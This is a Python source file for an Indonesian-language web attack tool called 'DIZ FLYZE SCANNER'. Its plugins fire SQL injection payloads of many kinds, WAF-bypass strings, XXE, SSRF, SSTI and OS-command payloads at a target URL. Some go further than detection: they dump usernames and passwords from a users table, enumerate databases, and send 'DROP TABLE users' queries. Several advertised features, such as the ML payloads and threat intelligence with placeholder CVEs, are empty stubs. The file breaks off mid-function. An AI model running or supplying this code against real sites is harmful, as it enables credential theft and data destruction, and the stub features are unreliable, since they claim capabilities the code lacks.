#!/usr/bin/env python3
import asyncio
import aiohttp
import argparse
import time
import os
import importlib.util
import json
import random
import logging
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from abc import ABC, abstractmethod
from threading import Thread
from rich.console import Console
from rich.panel import Panel
from rich.text import Text
from fake_useragent import UserAgent
try:
    from interactsh import InteractshClient
except ImportError:
    InteractshClient = None
try:
    from flask import Flask, jsonify
except ImportError:
    Flask = None
try:
    from selenium import webdriver
    from selenium.webdriver.chrome.options import Options
except ImportError:
    webdriver = None
try:
    import jsonpickle
except ImportError:
    jsonpickle = None

logging.basicConfig(level=logging.INFO, format='[%(asctime)s] %(levelname)s: %(message)s')
ERROR_SIGNATURES = ["sql syntax", "mysql_fetch", "ora-01756", "sqlstate"]
PAYLOADS_ERROR = ["'", "\"", "' OR '1'='1", "\" OR \"1\"=\"1", "' UNION SELECT NULL--", "\" UNION SELECT NULL--", "' OR 1=1--", "\" OR 1=1--"]
PAYLOADS_BLIND_TRUE = ["' AND 1=1--", "\" AND 1=1--"]
PAYLOADS_BLIND_FALSE = ["' AND 1=2--", "\" AND 1=2--"]
PAYLOADS_TIME = ["' OR SLEEP(5)--", "\" OR SLEEP(5)--"]
PAYLOADS_STACKED = ["'; DROP TABLE users; --", "\"; DROP TABLE users; --"]
WAF_BYPASS_PAYLOADS = ["' OR '1'='1", "' OR '1'='1' -- ", "' OR 1=1--", "' OR 1=1#"]
ADMIN_PATHS = ["/admin", "/administrator", "/admin/login", "/login", "/user/login", "/cpanel", "/backend", "/manager"]
PAYLOADS_OS_COMMAND = ["; id", "&& id", "| id"]
PAYLOADS_XXE = ['<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>']
PAYLOADS_SSRF = ["http://169.254.169.254/latest/meta-data/"]
PAYLOADS_SSTI = ["{{7*7}}", "{%7*7%}"]
console = Console()
def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')
def draw_logo():
    clear_console()
    logo = r"""
█████████████████
██                   ██
██                       ██
██                           ██
██                               ██

██████╗  ██╗ ███████╗  █████╗   █████╗   █████╗
██╔══██╗ ██║ ╚══███╔╝ ██╔══██╗ ██╔══██╗ ██╔══██╗
██║  ██║ ██║   ███╔╝  ╚██████║ ╚██████║ ╚██████║
██║  ██║ ██║  ███╔╝    ╚═══██║  ╚═══██║  ╚═══██║
██████╔╝ ██║ ███████╗  █████╔╝  █████╔╝  █████╔╝
╚═════╝  ╚═╝ ╚══════╝  ╚════╝   ╚════╝   ╚════╝

██                               ██
██                           ██
██                       ██
██                   ██
█████████████████
"""
    console.print(Text(logo, style="bold cyan"), justify="center")
    time.sleep(1)
    console.print("\n")
def display_note():
    note = ("[bold yellow]\n[*] PERHATIAN PENTING [*][/bold yellow]\n"
            "DIZ FLYZE SCANNER ADALAH FRAMEWORK SCAN KEAMANAN YANG MODERN, MODULAR, DAN DAPAT DIKONFIGURASI.\n"
            "Gunakan dengan bijak dan pastikan Anda memiliki izin pada target yang diuji.\n")
    panel = Panel(note, title="[bold cyan]DIZ FLYZE SCANNER", subtitle="[bold yellow]I AM NO COUNTER", style="bold green")
    console.print(panel, justify="center")
async def sandboxed_run(plugin, scanner):
    try:
        result = await plugin.run(scanner)
    except Exception as e:
        result = {plugin.name: f"Sandboxed error: {e}"}
        logging.error(f"Plugin {plugin.name} error: {e}")
    return result
class BasePlugin(ABC):
    name: str
    @abstractmethod
    async def run(self, scanner: "DizFlyzeScanner") -> dict:
        pass
class ErrorBasedPlugin(BasePlugin):
    name = "━━> ERROR BASED INJECTION <━━"
    async def run(self, scanner: "DizFlyzeScanner") -> dict:
        vulns = []
        for param in scanner.params:
            for payload in PAYLOADS_ERROR:
                req_url, req_data = scanner.build_request(param, payload)
                status, text = await scanner.fetch(req_url, req_data)
                detail = {"param": param, "payload": payload, "request": req_url, "status": status, "length": len(text) if text else 0, "snippet": text[:200] if text else ""}
                if text and any(sig in text.lower() for sig in ERROR_SIGNATURES):
                    vulns.append(detail)
        return {self.name: vulns}
class BlindBooleanPlugin(BasePlugin):
    name = "━━> BLIND BOOLEAN INJECTION <━━"
    async def run(self, scanner: "DizFlyzeScanner") -> dict:
        vulns = []
        for param in scanner.params:
            req_url_true, req_data_true = scanner.build_request(param, PAYLOADS_BLIND_TRUE[0])
            req_url_false, req_data_false = scanner.build_request(param, PAYLOADS_BLIND_FALSE[0])
            status_true, text_true = await scanner.fetch(req_url_true, req_data_true)
            status_false, text_false = await scanner.fetch(req_url_false, req_data_false)
            detail = {"param": param, "true_payload": PAYLOADS_BLIND_TRUE[0], "false_payload": PAYLOADS_BLIND_FALSE[0], "request_true": req_url_true, "request_false": req_url_false, "status_true": status_true, "status_false": status_false, "len_true": len(text_true) if text_true else 0, "len_false": len(text_false) if text_false else 0}
            if text_true and text_false and abs(len(text_true) - len(text_false)) > 30:
                vulns.append(detail)
        return {self.name: vulns}
class TimeBasedPlugin(BasePlugin):
    name = "━━> TIME BASED INJECTION <━━"
    async def run(self, scanner: "DizFlyzeScanner") -> dict:
        vulns = []
        for param in scanner.params:
            for payload in PAYLOADS_TIME:
                req_url, req_data = scanner.build_request(param, payload)
                start = time.time()
                status, text = await scanner.fetch(req_url, req_data)
                delay = time.time() - start
                detail = {"param": param, "payload": payload, "request": req_url, "status": status, "delay": round(delay, 2), "length": len(text) if text else 0, "response_detail": text if text else "━>> [ TIDAK ADA RESPON DETAIL ]"}
                if delay >= 5:
                    vulns.append(detail)
        return {self.name: vulns}
class UnionBasedPlugin(BasePlugin):
    name = "━━> UNION BASED EKSTRAKTION <━━"
    async def run(self, scanner: "DizFlyzeScanner") -> dict:
        vulns = {}
        for param in scanner.params:
            result = await scanner.union_based_extraction(param)
            vulns[param] = {"extraction": result if result else "━>> [ TIDAK ADA EXTRACTION DETAIL ]", "info": "Union extraction"}
        return {self.name: vulns}
class StackedQueryPlugin(BasePlugin):
    name = "━━> STACKED QUERY INJECTION <━━"
    async def run(self, scanner: "DizFlyzeScanner") -> dict:
        vulns = []
        for param in scanner.params:
            for payload in PAYLOADS_STACKED:
                req_url, req_data = scanner.build_request(param, payload)
                status, text = await scanner.fetch(req_url, req_data)
                detail = {"param": param, "payload": payload, "request": req_url, "status": status, "length": len(text) if text else 0, "response_detail": text if text else "━>> [ TIDAK ADA RESPON ]"}
                if text and "error" not in text.lower():
                    vulns.append(detail)
        return {self.name: vulns}
class AdvancedUnionPlugin(BasePlugin):
    name = "━━> ADVANCED UNION INJECTION <━━"
    async def run(self, scanner: "DizFlyzeScanner") -> dict:
        vulns = {}
        for param in scanner.params:
            col_count = await scanner.detect_column_count(param, "'")
            if col_count <= 0:
                vulns[param] = "Insufficient columns"
            else:
                payload = f"' UNION SELECT group_concat(table_name), {', '.join(['NULL'] * (col_count - 1))} FROM information_schema.tables--"
                req_url, req_data = scanner.build_request(param, payload)
                status, text = await scanner.fetch(req_url, req_data)
                vulns[param] = {"payload": payload, "request": req_url, "status": status, "result": text if text else "━>> [ TIDAK ADA RESPON ]"}
        return {self.name: vulns}
class SecondOrderPlugin(BasePlugin):
    name = "━━> SECOND ORDER INJECTION <━━"
    async def run(self, scanner: "DizFlyzeScanner") -> dict:
        vulns = []
        for param in scanner.params:
            payload = "'; SELECT 'SECOND_ORDER_DETECTED'--"
            req_url, req_data = scanner.build_request(param, payload)
            status, text = await scanner.fetch(req_url, req_data)
            detail = {"param": param, "payload": payload, "request": req_url, "status": status, "length": len(text) if text else 0, "response_detail": text if text else "━>> [ TIDAK ADA RESPON DETAIL ]"}
            if text and "second_order_detected" in text.lower():
                vulns.append(detail)
        return {self.name: vulns}
class EnhancedOOBInjectionPlugin(BasePlugin):
    name = "━━> OOB INJECTION <━━"
    async def run(self, scanner: "DizFlyzeScanner") -> dict:
        results = []
        if InteractshClient:
            oob_client = InteractshClient()
            oob_domain = await asyncio.to_thread(oob_client.register)
        else:
            oob_domain = "oobv10.dizflyze.com"
        for param in scanner.params:
            payload = f"' UNION SELECT load_file('\\\\{oob_domain}\\share')--"
            req_url, req_data = scanner.build_request(param, payload)
            status, text = await scanner.fetch(req_url, req_data)
            results.append({"param": param, "payload": payload, "status": status, "response_detail": text if text else "━>> [ TIDAK ADA RESPON ]"})
        return {self.name: results}
class DBFingerprintPlugin(BasePlugin):
    name = "━━> DB FINGERPRINT <━━"
    async def run(self, scanner: "DizFlyzeScanner") -> dict:
        vulns = {}
        for param in scanner.params:
            col_count = await scanner.detect_column_count(param, "'")
            if col_count < 3:
                vulns[param] = "Insufficient columns for fingerprinting"
            else:
                fields = ["@@version", "user()", "database()"]
                nulls = ["NULL"] * col_count
                for idx, field in enumerate(fields):
                    if idx < col_count:
                        nulls[idx] = field
                union_payload = "' UNION SELECT " + ", ".join(nulls) + "--"
                req_url, req_data = scanner.build_request(param, union_payload)
                status, text = await scanner.fetch(req_url, req_data)
                vulns[param] = {"payload": union_payload, "request": req_url, "status": status, "fingerprint": text if text else "━>> [ TIDAK ADA RESPON DETAIL ]"}
        return {self.name: vulns}
class AdvancedPayloadPlugin(BasePlugin):
    name = "━━> SEMUA PAYLOAD KOMBINASI <━━"
    async def run(self, scanner: "DizFlyzeScanner") -> dict:
        vulns = []
        for param in scanner.params:
            for payload1 in PAYLOADS_ERROR:
                for payload2 in PAYLOADS_STACKED:
                    combined_payload = f"{payload1} {payload2}"
                    req_url, req_data = scanner.build_request(param, combined_payload)
                    status, text = await scanner.fetch(req_url, req_data)
                    detail = {"param": param, "payload": combined_payload, "request": req_url, "status": status, "length": len(text) if text else 0, "response_detail": text if text else "━>> [ TIDAK ADA RESPON ]"}
                    if text and any(sig in text.lower() for sig in ERROR_SIGNATURES):
                        vulns.append(detail)
        return {self.name: vulns}
class DBMSFingerprintPlugin(BasePlugin):
    name = "━━> DBMS FINGERPRINT <━━"
    async def run(self, scanner: "DizFlyzeScanner") -> dict:
        vulns = {}
        for param in scanner.params:
            col_count = await scanner.detect_column_count(param, "'")
            if col_count < 4:
                vulns[param] = "Insufficient columns for full fingerprinting"
            else:
                fields = ["@@version", "user()", "database()", "@@datadir"]
                nulls = ["NULL"] * col_count
                for idx, field in enumerate(fields):
                    if idx < col_count:
                        nulls[idx] = field
                union_payload = "' UNION SELECT " + ", ".join(nulls) + "--"
                req_url, req_data = scanner.build_request(param, union_payload)
                status, text = await scanner.fetch(req_url, req_data)
                vulns[param] = {"payload": union_payload, "request": req_url, "status": status, "fingerprint": text if text else "━>> [ TIDAK ADA RESPON ]"}
        return {self.name: vulns}
class DataExtractionPlugin(BasePlugin):
    name = "━━> DATA EXTRACTION <━━"
    async def run(self, scanner: "DizFlyzeScanner") -> dict:
        vulns = {}
        for param in scanner.params:
            col_count = await scanner.detect_column_count(param, "'")
            if col_count >= 3:
                payload = f"' UNION SELECT group_concat(username,0x3a,password), {', '.join(['NULL'] * (col_count - 1))} FROM users--"
                req_url, req_data = scanner.build_request(param, payload)
                status, text = await scanner.fetch(req_url, req_data)
                vulns[param] = {"payload": payload, "request": req_url, "status": status, "data": text if text else "━>> [ TIDAK ADA RESPON ]"}
        return {self.name: vulns}
class ParameterTamperingPlugin(BasePlugin):
    name = "━━> PARAMETER TAMPERING <━━"
    async def run(self, scanner: "DizFlyzeScanner") -> dict:
        vulns = {}
        for param in scanner.params:
            req_url_benign, req_data_benign = scanner.build_request(param, "")
            req_url_mal, req_data_mal = scanner.build_request(param, "'")
            benign_status, benign_text = await scanner.fetch(req_url_benign, req_data_benign)
            malicious_status, malicious_text = await scanner.fetch(req_url_mal, req_data_mal)
            detail = {"param": param, "benign_request": req_url_benign, "malicious_request": req_url_mal, "benign_status": benign_status, "malicious_status": malicious_status, "len_benign": len(benign_text) if benign_text else 0, "len_malicious": len(malicious_text) if malicious_text else 0, "benign_response": benign_text if benign_text else "━>> [ TIDAK ADA RESPON ]", "malicious_response": malicious_text if malicious_text else "━>> [ TIDAK ADA RESPON ]"}
            if benign_text and malicious_text and abs(len(benign_text) - len(malicious_text)) > 50:
                vulns[param] = detail
        return {self.name: vulns}
class HybridInjectionPlugin(BasePlugin):
    name = "━━> HYBRID INJECTION <━━"
    async def run(self, scanner: "DizFlyzeScanner") -> dict:
        vulns = []
        for param in scanner.params:
            payload = "' OR (SELECT IF(1=1,SLEEP(5),0))--"
            req_url, req_data = scanner.build_request(param, payload)
            start = time.time()
            status, text = await scanner.fetch(req_url, req_data)
            delay = time.time() - start
            detail = {"param": param, "payload": payload, "request": req_url, "status": status, "delay": round(delay, 2), "length": len(text) if text else 0, "response_detail": text if text else "━>> [ TIDAK ADA RESPON ]"}
            if delay >= 5 and any(sig in text.lower() for sig in ERROR_SIGNATURES):
                vulns.append(detail)
        return {self.name: vulns}
class DynamicPluginLoader(BasePlugin):
    name = "━━> DINAMIC PLUGIN LOADER <━━"
    async def run(self, scanner: "DizFlyzeScanner") -> dict:
        loaded_plugins = []
        plugin_dir = "./plugins"
        if os.path.isdir(plugin_dir):
            for file in os.listdir(plugin_dir):
                if file.endswith(".py"):
                    module_path = os.path.join(plugin_dir, file)
                    spec = importlib.util.spec_from_file_location("plugin_module", module_path)
                    mod = importlib.util.module_from_spec(spec)
                    spec.loader.exec_module(mod)
                    if hasattr(mod, "run_plugin"):
                        loaded_plugins.append(mod.run_plugin)
        return {self.name: f"Loaded {len(loaded_plugins)} dynamic plugins"}
class AdminLoginDiscoveryPlugin(BasePlugin):
    name = "━━> ADMIN LOGIN DISCOVERY <━━"
    async def run(self, scanner: "DizFlyzeScanner") -> dict:
        discovered = []
        base_url = f"{scanner.parsed.scheme}://{scanner.parsed.netloc}"
        for path in ADMIN_PATHS:
            req_url = base_url + path
            status, _ = await scanner.fetch(req_url, None)
            if status and isinstance(status, int) and status < 400:
                discovered.append({"url": req_url, "status": status})
        return {self.name: discovered}
class FullDatabaseInfoPlugin(BasePlugin):
    name = "━━> FULL DATABASE INFO <━━"
    async def run(self, scanner: "DizFlyzeScanner") -> dict:
        info = {}
        for param in scanner.params:
            col_count = await scanner.detect_column_count(param, "'")
            if col_count < 3:
                info[param] = "Insufficient columns for full DB info"
            else:
                payload = f"' UNION SELECT @@version, user(), database()--"
                req_url, req_data = scanner.build_request(param, payload)
                status, text = await scanner.fetch(req_url, req_data)
                info[param] = {"payload": payload, "request": req_url, "status": status, "db_info": text if text else "━>> [ TIDAK ADA RESPON ]"}
        return {self.name: info}
class WAFBypassPlugin(BasePlugin):
    name = "━━> BYPASS WAF <━━"
    async def run(self, scanner: "DizFlyzeScanner") -> dict:
        bypass_results = []
        for param in scanner.params:
            for payload in WAF_BYPASS_PAYLOADS:
                req_url, req_data = scanner.build_request(param, payload)
                status, text = await scanner.fetch(req_url, req_data)
                if status and isinstance(status, int) and status < 400:
                    bypass_results.append({"param": param, "payload": payload, "request": req_url, "status": status, "length": len(text) if text else 0, "response_detail": text if text else "━>> [ TIDAK ADA RESPON ]"})
        return {self.name: bypass_results}
class AdvancedEndpointCrawlerPlugin(BasePlugin):
    name = "━━> ADVANCED ENDPOINT CRAWLER <━━"
    async def run(self, scanner: "DizFlyzeScanner") -> dict:
        endpoints = set()
        base_url = f"{scanner.parsed.scheme}://{scanner.parsed.netloc}"
        status, text = await scanner.fetch(base_url, None)
        if status and text:
            try:
                from bs4 import BeautifulSoup
                soup = BeautifulSoup(text, "html.parser")
                for tag in soup.find_all(['a', 'form']):
                    href = tag.get("href") or tag.get("action")
                    if href:
                        if href.startswith("http"):
                            endpoints.add(href)
                        else:
                            endpoints.add(urlunparse((scanner.parsed.scheme, scanner.parsed.netloc, href, "", "", "")))
            except ImportError:
                endpoints.add("BeautifulSoup not installed")
        return {self.name: list(endpoints)}
class NoSQLInjectionPlugin(BasePlugin):
    name = "━━> NOSQL INJECTION <━━"
    async def run(self, scanner: "DizFlyzeScanner") -> dict:
        nosql_payloads = ["{'$ne': null}", '{"$ne": ""}', "' or '1'='1", "\" or \"1\"=\"1"]
        results = []
        for param in scanner.params:
            for payload in nosql_payloads:
                req_url, req_data = scanner.build_request(param, payload)
                status, text = await scanner.fetch(req_url, req_data)
                detail = {"param": param, "payload": payload, "request": req_url, "status": status, "length": len(text) if text else 0, "response_detail": text if text else "━>> [ TIDAK ADA RESPON ]"}
                results.append(detail)
        return {self.name: results}
class ParameterFuzzerPlugin(BasePlugin):
    name = "━━> PARAMETER FUZZER <━━"
    async def run(self, scanner: "DizFlyzeScanner") -> dict:
        fuzz_values = ["<script>alert(1)</script>", "admin", "1 OR 1=1", "' OR 'a'='a", "test", "NULL", "undefined"]
        results = []
        for param in scanner.params:
            for value in fuzz_values:
                req_url, req_data = scanner.build_request(param, value)
                status, text = await scanner.fetch(req_url, req_data)
                detail = {"param": param, "fuzz_value": value, "request": req_url, "status": status, "length": len(text) if text else 0, "response_detail": text if text else "━>> [ TIDAK ADA RESPON ]"}
                results.append(detail)
        return {self.name: results}
class AdvancedObfuscationPlugin(BasePlugin):
    name = "━━> ADVANCED OBFUSCATION <━━"
    async def run(self, scanner: "DizFlyzeScanner") -> dict:
        obfuscation_payloads = ["'/**/OR/**/1=1--", "'/*!50000union*/ select null,@@version--", "' or/**/1=1--", "' or 1=1#"]
        results = []
        for param in scanner.params:
            for payload in obfuscation_payloads:
                req_url, req_data = scanner.build_request(param, payload)
                status, text = await scanner.fetch(req_url, req_data)
                detail = {"param": param, "payload": payload, "request": req_url, "status": status, "length": len(text) if text else 0, "response_detail": text if text else "━>> [ TIDAK ADA RESPON ]"}
                results.append(detail)
        return {self.name: results}
class ComprehensiveReportPlugin(BasePlugin):
    name = "━━> COMPREHENSIVE REPORT <━━"
    async def run(self, scanner: "DizFlyzeScanner") -> dict:
        report = {"target": scanner.target_url, "results": scanner.results, "log": scanner.log, "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")}
        try:
            with open("scan_report.json", "w") as f:
                json.dump(report, f, indent=4)
            html_report = f"<html><body><h1>Scan Report for {scanner.target_url}</h1><pre>{json.dumps(report, indent=4)}</pre></body></html>"
            with open("scan_report.html", "w") as f:
                f.write(html_report)
        except Exception as e:
            logging.error(f"Error saving reports: {e}")
        return {self.name: report}
class MultiDBMSFingerprintPlugin(BasePlugin):
    name = "━━> MULTI DB FINGERPRINT <━━"
    async def run(self, scanner: "DizFlyzeScanner") -> dict:
        vulns = {}
        for param in scanner.params:
            mysql_payload = "' UNION SELECT @@version, user(), database()--"
            req_url, req_data = scanner.build_request(param, mysql_payload)
            status, text = await scanner.fetch(req_url, req_data)
            vulns[param] = {"MySQL": text if text else "━>> [ TIDAK ADA RESPON ]"}
        return {self.name: vulns}
class DatabaseStructureEnumerationPlugin(BasePlugin):
    name = "━━> DATABASE STRUCTURE ENUMERATION <━━"
    async def run(self, scanner: "DizFlyzeScanner") -> dict:
        results = {}
        for param in scanner.params:
            col_count = await scanner.detect_column_count(param, "'")
            if col_count >= 3:
                payload = f"' UNION SELECT group_concat(schema_name), NULL, NULL FROM information_schema.schemata--"
                req_url, req_data = scanner.build_request(param, payload)
                status, text = await scanner.fetch(req_url, req_data)
                results[param] = {"databases": text if text else "━>> [ TIDAK ADA RESPON ]"}
        return {self.name: results}
class HeaderInjectionPlugin(BasePlugin):
    name = "━━> HEADER INJECTION <━━"
    async def run(self, scanner: "DizFlyzeScanner") -> dict:
        results = []
        injection_headers = {"X-Forwarded-For": "' OR '1'='1", "Referer": "' OR '1'='1"}
        for header, payload in injection_headers.items():
            original = scanner.headers.get(header, "")
            scanner.headers[header] = payload
            status, text = await scanner.fetch(scanner.target_url, None)
            results.append({header: {"payload": payload, "status": status, "snippet": text[:100] if text else "━>> [ TIDAK ADA RESPON ]"}})
            scanner.headers[header] = original
        return {self.name: results}
class JSONInjectionPlugin(BasePlugin):
    name = "━━> JSON INJECTION <━━"
    async def run(self, scanner: "DizFlyzeScanner") -> dict:
        results = []
        json_payloads = ["{'injected': true}", '{"injected": true}']
        for param in scanner.params:
            for payload in json_payloads:
                req_url, req_data = scanner.build_request(param, payload)
                status, text = await scanner.fetch(req_url, req_data)
                results.append({"param": param, "payload": payload, "status": status, "response_detail": text if text else "━>> [ TIDAK ADA RESPON ]"})
        return {self.name: results}
class ParameterPollutionPlugin(BasePlugin):
    name = "━━> PARAMETER POLLUTION <━━"
    async def run(self, scanner: "DizFlyzeScanner") -> dict:
        results = []
        for param in scanner.params:
            polluted_data = scanner.params.copy()
            polluted_data[param] = [scanner.params[param][0], scanner.params[param][0] + "'"]
            new_query = urlencode(polluted_data, doseq=True)
            polluted_url = urlunparse((scanner.parsed.scheme, scanner.parsed.netloc, scanner.parsed.path, scanner.parsed.params, new_query, scanner.parsed.fragment))
            status, text = await scanner.fetch(polluted_url, None)
            results.append({"param": param, "polluted_url": polluted_url, "status": status, "response_detail": text if text else "━>> [ TIDAK ADA RESPON ]"})
        return {self.name: results}
class AdaptivePayloadOptimizationPlugin(BasePlugin):
    name = "━━> ADAPTIVE PAYLOAD OPTIMIZATION <━━"
    async def run(self, scanner: "DizFlyzeScanner") -> dict:
        optimized_payloads = []
        for log_entry in scanner.log:
            if "error" in log_entry.get("snippet", "").lower():
                optimized_payloads.append("/* optimized payload */")
        if not optimized_payloads:
            optimized_payloads = ["' OR '1'='1", "' OR 'a'='a"]
        results = []
        for param in scanner.params:
            for payload in optimized_payloads:
                req_url, req_data = scanner.build_request(param, payload)
                status, text = await scanner.fetch(req_url, req_data)
                results.append({"param": param, "optimized_payload": payload, "status": status, "response_detail": text if text else "━>> [ TIDAK ADA RESPON ]"})
        return {self.name: results}
class AdaptiveMLPayloadPlugin(BasePlugin):
    name = "━━> ADAPTIVE ML PAYLOAD SELECTION <━━"
    def __init__(self):
        self.model = self.load_ml_model()
    def load_ml_model(self):
        return lambda param: f"' OR '{param}_ml_injected'='{param}_ml_injected"
    async def run(self, scanner: "DizFlyzeScanner") -> dict:
        results = []
        for param in scanner.params:
            payload = self.model(param)
            req_url, req_data = scanner.build_request(param, payload)
            status, text = await scanner.fetch(req_url, req_data)
            results.append({"param": param, "ml_payload": payload, "status": status, "response_detail": text if text else "━>> [ TIDAK ADA RESPON ]"})
        return {self.name: results}
class ThreatIntelligencePlugin(BasePlugin):
    name = "━━> THREAT INTELLIGENCE INTEGRATION <━━"
    async def run(self, scanner: "DizFlyzeScanner") -> dict:
        threat_data = {"CVE-2021-1234": "High severity SQL injection vulnerability in XYZ component", "CVE-2022-5678": "Medium severity information disclosure vulnerability"}
        return {self.name: threat_data}
class UserManagementPlugin(BasePlugin):
    name = "━━> USER MANAGEMENT & AUDIT TRAIL <━━"
    async def run(self, scanner: "DizFlyzeScanner") -> dict:
        audit_summary = {"current_user": "admin", "roles": ["tester", "developer"], "audit_entries": len(scanner.log)}
        return {self.name: audit_summary}
class MessageQueueIntegrationPlugin(BasePlugin):
    name = "━━> MESSAGE QUEUE INTEGRATION <━━"
    async def run(self, scanner: "DizFlyzeScanner") -> dict:
        await asyncio.sleep(0.5)
        return {self.name: "Message queue integration: tasks enqueued."}
class MicroservicesOrchestrationPlugin(BasePlugin):
    name = "━━> MICROSERVICES ORCHESTRATION <━━"
    async def run(self, scanner: "DizFlyzeScanner") -> dict:
        await asyncio.sleep(0.5)
        return {self.name: "Microservices orchestration: scan tasks distributed."}
class APIServerPlugin(BasePlugin):
    name = "━━> REST API SERVER <━━"
    def __init__(self):
        if Flask:
            self.port = random.randint(1000, 9999)
            self.app = Flask("ScanAPIServer")
            self.data = {}
            self.thread = None
            @self.app.route("/api/scan")
            def scan_api():
                return json.dumps(self.data)
        else:
            self.app = None
    def update_data(self, data):
        self.data = data
    async def run(self, scanner: "DizFlyzeScanner") -> dict:
        if not self.app:
            return {self.name: "Flask not installed"}
        if not getattr(self, "thread", None):
            self.thread = Thread(target=self.app.run, kwargs={"port": self.port})
            self.thread.daemon = True
            self.thread.start()
        self.update_data({"target": scanner.target_url, "results": scanner.results, "log": scanner.log})
        return {self.name: f"REST API server running at http://127.0.0.1:{self.port}/api/scan"}
class AdditionalInjectionTechniquesPlugin(BasePlugin):
    name = "━━> ADDITIONAL INJECTION TECHNIQUES <━━"
    async def run(self, scanner: "DizFlyzeScanner") -> dict:
        results = []
        for param in scanner.params:
            for payload in PAYLOADS_SSTI:
                req_url, req_data = scanner.build_request(param, payload)
                status, text = await scanner.fetch(req_url, req_data)
                results.append({"param": param, "SSTI_payload": payload, "status": status, "response_detail": text if text else "━>> [ TIDAK ADA RESPON ]"})
        for param in scanner.params:
            for payload in PAYLOADS_OS_COMMAND:
                req_url, req_data = scanner.build_request(param, payload)
                status, text = await scanner.fetch(req_url, req_data)
                results.append({"param": param, "OS_cmd_payload": payload, "status": status, "response_detail": text if text else "━>> [ TIDAK ADA RESPON ]"})
        for param in scanner.params:
            for payload in PAYLOADS_XXE:
                req_url, req_data = scanner.build_request(param, payload)
                status, text = await scanner.fetch(req_url, req_data)
                results.append({"param": param, "XXE_payload": payload, "status": status, "response_detail": text if text else "━>> [ TIDAK ADA RESPON ]"})
        for param in scanner.params:
            for payload in PAYLOADS_SSRF:
                req_url, req_data = scanner.build_request(param, payload)
                status, text = await scanner.fetch(req_url, req_data)
                results.append({"param": param, "SSRF_payload": payload, "status": status, "response_detail": text if text else "━>> [ TIDAK ADA RESPON ]"})
        return {self.name: results}
class DistributedScanningPlugin(BasePlugin):
    name = "━━> DISTRIBUTED SCANNING <━━"
    async def run(self, scanner: "DizFlyzeScanner") -> dict:
        await asyncio.sleep(1)
        return {self.name: "Distributed scanning tasks executed."}
class HeadlessBrowserPlugin(BasePlugin):
    name = "━━> HEADLESS BROWSER RENDERING <━━"
    async def run(self, scanner: "DizFlyzeScanner") -> dict:
        if not webdriver:
            return {self.name: "Selenium not installed"}
        options = Options()
        options.add_argument("--headless")
        driver = webdriver.Chrome(options=options)
        driver.get(scanner.target_url)
        rendered = driver.page_source
        driver.quit()
        return {self.name: {"rendered_length": len(rendered)}}
class AutomationOrchestrationPlugin(BasePlugin):
    name = "━━> AUTOMATION ORCHESTRATION <━━"
    async def run(self, scanner: "DizFlyzeScanner") -> dict:
        await asyncio.sleep(1)
        return {self.name: "Scan tasks scheduled and orchestrated."}
class InternalSecurityHardeningPlugin(BasePlugin):
    name = "━━> INTERNAL SECURITY HARDENING <━━"
    async def run(self, scanner: "DizFlyzeScanner") -> dict:
        return {self.name: "Scanner self-assessment passed security checks."}
class DizFlyzeScanner:
    def __init__(self, target_url: str, method: str = "GET", proxy: str = None, timeout: int = 10):
        self.target_url = target_url
        self.parsed = urlparse(target_url)
        self.method = method.upper()
        self.proxy = proxy
        self.timeout = timeout
        self.ua = UserAgent()
        self.headers = {"User-Agent": self.ua.random}
        if self.method == "POST":
            self.post_data = parse_qs(self.parsed.query)
            self.base_url = urlunparse((self.parsed.scheme, self.parsed.netloc, self.parsed.path, "", "", ""))
            self.params = self.post_data
        else:
            self.params = parse_qs(self.parsed.query)
        self.plugins = []
        self.results = {}
        self.log = []
        self.session = None
        self.adaptive_mode = False
    def update_adaptive_mode(self):
        total = len(self.log)
        errors = sum(1 for entry in self.log if entry.get("status") == "Error")
        self.adaptive_mode = (total > 0 and (errors/total) > 0.3)
    async def init_session(self):
        self.session = aiohttp.ClientSession(headers=self.headers)
    async def close_session(self):
        if self.session:
            await self.session.close()
    async def fetch(self, url: str, req_data=None, retries=3):
        attempt = 0
        while attempt < retries:
            try:
                if self.method == "POST":
                    async with self.session.post(url, data=req_data, proxy=self.proxy, timeout=self.timeout) as resp:
                        text = await resp.text(errors="ignore")
                        entry = {"request": url, "status": resp.status, "length": len(text), "snippet": text[:200]}
                        self.log.append(entry)
                        self.update_adaptive_mode()
                        return resp.status, text
                else:
                    async with self.session.get(url, proxy=self.proxy, timeout=self.timeout) as resp:
                        text = await resp.text(errors="ignore")
                        entry = {"request": url, "status": resp.status, "length": len(text), "snippet": text[:200]}
                        self.log.append(entry)
                        self.update_adaptive_mode()
                        return resp.status, text
            except Exception as e:
                attempt += 1
                await asyncio.sleep(2 ** attempt)
        return "Error", "Max retries reached"
    def build_request(self, param: str, injected_value: str):
        if self.adaptive_mode:
            injected_value = injected_value.split()[0]
        if self.method == "POST":
            new_data = self.post_data.copy()
            original = new_data.get(param, [""])[0]
            new_data[param] = [original + injected_value]
            return self.base_url, new_data
        else:
            params_copy = self.params.copy()
            original = params_copy.get(param, [""])[0]
            params_copy[param] = [original + injected_value]
            new_query = urlencode(params_copy, doseq=True)
            return urlunparse((self.parsed.scheme, self.parsed.netloc, self.parsed.path, self.parsed.params, new_query, self.parsed.fragment)), None
    async def detect_column_count(self, param: str, base_payload: str) -> int:
        for i in range(1, 31):
            payload = f"{base_payload} ORDER BY {i}--"
            req_url, req_data = self.build_request(param, payload)
            status, text = await self.fetch(req_url, req_data)
            if status == "Error" or (isinstance(status, int) and status >= 500) or ("order" in text.lower()):
                return i - 1
        return 0
    async def union_based_extraction(self, param: str, base_payload: str = "'") -> str:
        col_count = await self.detect_column_count(param, base_payload)
        if col_count <= 0:
            return "━>> [ TIDAK ADA EXTRACTION ]"
        nulls = ["NULL"] * col_count
        nulls[0] = "@@version"
        union_payload = "' UNION SELECT " + ", ".join(nulls) + "--"
        req_url, req_data = self.build_request(param, union_payload)
        status, text = await self.fetch(req_url, req_data)
        return text if text else "━>> [ TIDAK ADA EXTRACTION ]"
    def register_plugin(self, plugin: BasePlugin):
        self.plugins.append(plugin)
    async def run_plugins(self) -> dict:
        tasks = [asyncio.create_task(sandboxed_run(plugin, self)) for plugin in self.plugins]
        results_list = await asyncio.gather(*tasks, return_exceptions=False)
        for result in results_list:
            self.results.update(result)
        return self.results
def display_results(results: dict):
    separator = "━━" * 20 + "\n"
    console.print("\n[bold cyan]━━> ● DIZ FLYZE LIVE INFORMATION ●<━━[/bold cyan]\n")
